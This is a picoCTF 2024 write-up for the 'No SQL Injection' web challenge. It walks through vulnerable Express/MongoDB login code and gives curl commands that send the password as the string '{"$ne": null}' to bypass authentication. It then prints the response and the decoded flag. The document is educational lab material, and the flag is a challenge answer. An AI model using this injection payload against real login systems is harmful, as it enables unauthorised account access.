---
title: "picoCTF 2024 — No SQL Injection"
date: 2024-03-01
tags: [web, nosql, mongodb, picoctf]
ctf: "picoCTF 2024"
summary: "Bypassing authentication in a Node.js/Express app using MongoDB NoSQL injection to extract the flag from a token field."
draft: false
---



**Flag:** `picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_784e40e8}`

## Challenge Summary

A Node.js/Express app backed by MongoDB (via `mongoose`) exposes a `/login` endpoint. Source code is provided for download. The goal is to log in without knowing a valid password and retrieve a `token` field that contains the flag.

## Source Code Review

The relevant backend logic (`index.js` / `server.js`):

```javascript
const userSchema = new mongoose.Schema({
  email: { type: String, required: true, unique: true },
  firstName: { type: String, required: true },
  lastName: { type: String, required: true },
  password: { type: String, required: true },
  token: { type: String, required: false, default: "{{Flag}}" },
});

app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  try {
    const user = await User.findOne({
      email:
        email.startsWith("{") && email.endsWith("}")
          ? JSON.parse(email)
          : email,
      password:
        password.startsWith("{") && password.endsWith("}")
          ? JSON.parse(password)
          : password,
    });

    if (user) {
      res.json({
        success: true,
        email: user.email,
        token: user.token,
        firstName: user.firstName,
        lastName: user.lastName,
      });
    } else {
      res.json({ success: false });
    }
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});
```

Two things stand out immediately:

1. **A known seed user is created at startup** with a fixed, disclosed email:
   ```javascript
   const initialUser = new User({
     firstName: "pico",
     lastName: "player",
     email: "picoplayer355@picoctf.org",
     password: crypto.randomBytes(16).toString("hex").slice(0, 16), // random, unknown
   });
   ```
   The email is known; the password is random and not guessable.

2. **The login handler conditionally `JSON.parse`s the `email` and `password` fields** if they look like a JSON object (start with `{`, end with `}`). Whatever the result is gets passed *directly* into `User.findOne({...})` as the query filter  with no sanitization. This is a textbook **NoSQL injection**: an attacker can supply MongoDB query operators (`$ne`, `$gt`, `$regex`, etc.) instead of literal values.

## Exploitation

### Attempt 1  sending `password` as a raw JSON object

```bash
curl -X POST http://TARGET:PORT/login \
  -H "Content-Type: application/json" \
  -d '{"email": "picoplayer355@picoctf.org", "password": {"$ne": null}}'
```

Response:

```json
{"success":false,"error":"password.startsWith is not a function"}
```

Since the request body itself is JSON, `body-parser` parses `password` straight into a JavaScript **object**. Objects don't have `.startsWith`, so the vulnerable check throws before it ever reaches `JSON.parse`.

### Attempt 2  sending `password` as a JSON-encoded *string*

To trigger the vulnerable branch, `password` needs to arrive as a **string** that itself looks like `"{...}"`, so the app's own `.startsWith("{")` / `.endsWith("}")` check passes, and its `JSON.parse()` call turns that string into a real query operator object:

```bash
curl -X POST http://atlas.picoctf.net:PORT/login \
  -H "Content-Type: application/json" \
  -d '{"email": "picoplayer355@picoctf.org", "password": "{\"$ne\": null}"}'
```

Here the outer JSON body sends `password` as the literal string:

```
{"$ne": null}
```

Server-side, this becomes:

```javascript
password.startsWith("{") // true
password.endsWith("}")   // true
JSON.parse(password)     // { $ne: null }
```

So the resulting Mongo query is effectively:

```javascript
User.findOne({
  email: "picoplayer355@picoctf.org",
  password: { $ne: null }
});
```

Translated: *"find the user with this exact email, whose password is not equal to null"* — true for any account with a real password set, regardless of its actual value. This completely bypasses authentication without ever knowing the password.

### Result

```json
{
  "success": true,
  "email": "picoplayer355@picoctf.org",
  "token": "cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzc4NGU0MGU4fQ==",
  "firstName": "pico",
  "lastName": "player"
}
```

The `token` field is base64-encoded:

```bash
echo "cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzc4NGU0MGU4fQ==" | base64 -d
```

Decoded:

```
picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_784e40e8}
```

